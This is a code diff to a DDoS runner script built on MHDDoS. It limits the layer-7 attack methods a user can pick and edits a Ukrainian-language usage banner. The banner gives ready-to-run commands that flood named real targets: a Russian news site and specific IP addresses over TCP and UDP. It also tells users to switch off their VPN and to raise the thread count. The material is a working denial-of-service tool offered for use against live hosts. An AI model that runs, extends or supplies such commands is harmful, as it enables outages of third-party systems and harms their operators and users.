@@ -8,7 +8,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from multiprocessing import cpu_count
 
 import requests
-from MHDDoS.start import logger
+from MHDDoS.start import logger, Methods
 from PyRoxy import Proxy
 
 
@@ -205,6 +205,7 @@ def init_argparse() -> argparse.ArgumentParser:
         '--http-methods',
         nargs='+',
         default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
+        choices=Methods.LAYER7_METHODS - {'BOMB', 'KILLER'},
         help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
     )
     return parser
@@ -213,23 +214,23 @@ def init_argparse() -> argparse.ArgumentParser:
 def print_banner():
     print('''\
                             !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
-     (скрипт автоматично підбирає проксі, VPN тільки заважає як додатковий прошарок)
 
 # Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
 Для Docker замініть `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`
 
-- Повна документація - `python3 runner.py --help` 
 - Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
     python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
 - Інформація про хід атаки - прапорець `--debug`
     python3 runner.py --debug https://ria.ru tcp://194.54.14.131:22
 - Частота оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
     python3 runner.py -p 1200 https://ria.ru tcp://194.54.14.131:22
+- Повна документація - `python3 runner.py --help` 
 # Варіанти цілей (перші три можна змішувати в одній команді)
 - URL         https://ria.ru
 - IP + PORT   5.188.56.124:3606
 - TCP         tcp://194.54.14.131:22
-- UDP         udp://217.175.155.100:53 - !!!ДЛЯ ЦЬОГО ПОТРІБЕН VPN!!!
+- UDP         udp://217.175.155.100:53 - !!!ТІЛЬКИ ДЛЯ ЦЬОГО ПОТРІБЕН VPN!!!
+
                           !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
     ''')
 
